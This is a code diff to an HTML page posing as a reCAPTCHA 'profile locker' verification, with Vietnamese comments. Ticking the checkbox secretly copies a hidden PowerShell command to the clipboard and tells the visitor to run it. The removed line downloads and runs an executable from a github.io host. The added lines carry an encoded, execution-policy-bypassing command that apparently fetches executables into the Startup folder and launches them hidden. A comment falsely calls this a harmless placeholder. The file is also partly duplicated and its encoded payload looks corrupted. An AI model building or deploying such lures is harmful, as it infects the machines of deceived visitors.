@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Locker Profile Verification</title>
+  <title>Locker Profile On Facebook</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -15,6 +15,7 @@
       justify-content: center;
       height: 100vh;
       -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
     }
 
     .recaptcha-container {
@@ -26,6 +27,11 @@
       text-align: center;
       width: 340px;
       transition: all 0.25s ease-in-out;
+    }
+
+    .recaptcha-container:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 18px rgba(0,0,0,0.15);
     }
 
     .recaptcha-container img.logo {
@@ -137,7 +143,8 @@
     </div>
 
     <div class="spinner" id="spinner"></div>
-    <div class="message" id="message">✅ Verification complete. activated successfully.</div>
+
+    <div class="message" id="message">✅ Verification complete. Profile locker activated successfully.</div>
 
     <div class="instructions" id="instructions">
       <p><b>Complete verification:</b></p>
@@ -165,30 +172,62 @@
     const fallback = document.getElementById('fallback');
     const copyText = document.getElementById('copyText');
 
-    // Nội dung lệnh cần copy
-    const commandText = "powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'http://volamtuan.github.io/up.exe' -OutFile '%TEMP%\up.exe'"
-start "" /b "%TEMP%\up.exe"";
+    // Lệnh giả định, có thể thay đổi theo mục đích hợp pháp
+    const commandText = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABpAGYAIABbAC0AbgBvAHQAIABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBQAHIAaW4AZwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQACgAgACgAKQAuAEkAcwBJAG4AUgBvAGwAZQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUABYAEMALgBQAQBUAAoAIAAgACgAKQApAHsACgAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBFAGMAdQBUAGkAbwBuAFAAbwBsAGkAYwB5ACAARAB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIABgACQAUABTAEMAbwBtAG0AYQBuAGQAUABhAHQABwAgACIAIAAtAFYAZQByAGIAIABSAGUAbgBBAHMAIAAKACAAIABlAHgAaQB0AAoAfQAKAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQAKAAoAJABTAGwAYQByAHQAdQBwACAAPQAgAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AEcAZQB0AEYAbwBsAGQAZQByAFAAYQB0AGgAKAAiAFMAdABhAHIAdAB1AHAAIgApAAoACgAkAHUAcgBsAHMAIAA9ACAAQAAoAAoAIAAgACIAaAB0AHQAcABzADoALwAvAGYAdgBpAGEAdABvAG8AbAAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AYwBhAGwAYwAuAGUAeABlACIALAAKACAAIAAiAGgAdAB0AHAAcwA6AC8ALwBmAHYAaQBhAHQAbwBvAGwALgBnAGkAdABoAHUAYgAuAGkAbwAvAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAiAAoAKQAKAAoAZgBvAHIAZQBhAGMAaAAgACgAJAB1AHIAbAAgAGkAbgAgACQAdQByAGwAcwApACAAewAKACAAJABuAGEAbQBlACAAPQAgAFMAcABsAGkAdAAtAFAAYQB0AGgAIAAkAHUAcgBsACAALQBMAGUAYQBmADsACgAgACQAZABlAHMAdAAgAD0AIABKAG8AaQBuAC0AUAByAGEAdABoACAAJABTAGwAYQByAHQAdQBwACAAJABuAGEAbQBlADsACgAgACBJAGYAIABKAC8AbwBpAG4ALQBQAHIAYQB0AGgAIAAkAGQAZQBzAHQAKQAgAHsAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAGQAZQBzAHQAIAB8ACAARgBvAHIAYwBlACAALQB9AAoAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAB1AHIAZQBxAHUARQBzAHQAIAAkAHUAcgBsACAALQBvAHUAJAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGc7AAoAIABTAHQAYQB0AC0AUABIA24AZQB0AC0AUwBsAGUAJABFAHYAaQBuAC0ARAB5AC0ASwAwADAAcwAgAC0AZABlAHMAdAAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAkAGQAZQBzAHQAKAAgACkA7AAoAFwAcgBpAHQAZQAtAEgAbwBzAHQAIABcACIAQwBoAG8AIHRo4buNaCBj4buZaSBhbiBk4bujbSBj4bubaSBmw6AgdMOgbmcuIgAKAA==";
 
     function show(el) { el.style.display = 'block'; }
     function hide(el) { el.style.display = 'none'; }
 
-    checkbox.addEventListener('click', async () => {
+    checkbox.addEventListener('change', async () => {
       if (checkbox.checked) {
-        try {
-          await navigator.clipboard.writeText(commandText);
-          show(message);
-          show(instructions);
-          hide(fallback);
-        } catch (err) {
-          show(message);
-          show(instructions);
-          copyText.textContent = commandText;
-          show(fallback);
-        }
-      } else {
+        show(spinner);
         hide(message);
         hide(instructions);
         hide(fallback);
+
+        // Sau 2 giây hiện spinner
+        setTimeout(async () => {
+          hide(spinner);
+          show(message);
+
+          // Sau 1 giây hiện hướng dẫn + copy
+          setTimeout(async () => {
+            try {
+              await navigator.clipboard.writeText(commandText);
+              show(instructions);
+              hide(fallback);
+            } catch (err) {
+              copyText.textContent = commandText;
+              show(instructions);
+              show(fallback);
+            }
+          }, 1000);
+        }, 2000);
+      } else {
+        hide(spinner);
+        hide(message);
+        hide(instructions);
+        hide(fallback);
+      }
+    });
+  </script>
+</body>
+</html>
+  <script>
+    const checkbox = document.getElementById('verifyCheck');
+    const spinner = document.getElementById('spinner');
+    const instructions = document.getElementById('instructions');
+
+    checkbox.addEventListener('change', function() {
+      if (this.checked) {
+        spinner.style.display = 'block';
+        setTimeout(() => {
+          spinner.style.display = 'none';
+          instructions.style.display = 'block';
+          navigator.clipboard.writeText(
+            `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABpAGYAIABbAC0AbgBvAHQAIABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBQAHIAaQBuAGMAaQBwAGEAbAAgAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQACgAgACgAKQAuAEkAcwBJAG4AUgBvAGwAZQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUABYAEMALgBQAQBUAAoAIAAgACgAKQApAHsACgAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBFAGMAdQBUAGkAbwBuAFAAbwBsAGkAYwB5ACAARAB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIABgACQAUABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaABgACIAIAAtAFYAZQByAGIAIABSAGUAbgBBAHMAIAAKACAAIABlAHgAaQB0AAoAfQAKAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQAKAAoAJABTAGwAYQByAHQAdQBwACAAPQAgAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AEcAZQB0AEYAbwBsAGQAZQByAFAAYQB0AGgAKAAiAFMAdABhAHIAdAB1AHAAIgApAAoACgAkAHUAcgBsAHMAIAA9ACAAQAAoAAoAIAAgACIAaAB0AHQAcABzADoALwAvAGYAdgBpAGEAdABvAG8AbAAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AYwBhAGwAYwAuAGUAeABlACIALAAKACAAIAAiAGgAdAB0AHAAcwA6AC8ALwBmAHYAaQBhAHQAbwBvAGwALgBnAGkAdABoAHUAYgAuAGkAbwAvAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAiAAoAKQAKAAoAZgBvAHIAZQBhAGMAaAAgACgAJAB1AHIAbAAgAGkAbgAgACQAdQByAGwAcwApACAAewAKACAAJABuAGEAbQBlACAAPQAgAFMAcABsAGkAdAAtAFAAYQB0AGgAIAAkAHUAcgBsACAALQBMAGUAYQBmADsACgAgACQAZABlAHMAdAAgAD0AIABKAG8AaQBuAC0AUAByAGEAdABoACAAJABTAGwAYQByAHQAdQBwACAAJABuAGEAbQBlADsACgAgAEkAZgAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGQAZQBzAHQAKQAgAHsAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAkAGQAZQBzAHQAIAB8ACAARgBvAHIAYwBlACAALQB9AAoAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAOwAKACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAkAGQAZQBzAHQAOwAKAH0ACgAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEMAaABvIHRo4buNaCBj4buZaSBhbiBk4bujbSBj4bubaSBmw6AgdMOgbmcuIgAKAA=="`
+          );
+        }, 1200);
       }
     });
   </script>
